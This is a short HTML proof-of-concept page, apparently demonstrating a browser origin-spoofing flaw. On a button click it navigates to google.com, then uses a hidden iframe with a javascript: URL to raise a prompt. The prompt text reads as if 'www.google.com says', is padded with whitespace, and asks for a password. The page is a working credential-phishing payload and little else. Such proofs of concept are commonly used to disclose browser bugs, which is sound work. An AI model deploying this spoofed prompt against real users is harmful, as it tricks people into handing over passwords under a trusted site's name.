<!DOCTYPE html>
<html>
<head>
    <title>PoC</title>
    <script>
    function triggerIframe() {
        var iframe = document.createElement('iframe');
        document.location="http://www.google.com";
        iframe.src = 'javascript:prompt("www.google.com says                                                                                                                                     Password:")';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
    }
    </script>
</head>
<body>
    <button onclick="triggerIframe()">Trigger</button>
</body>
</html>
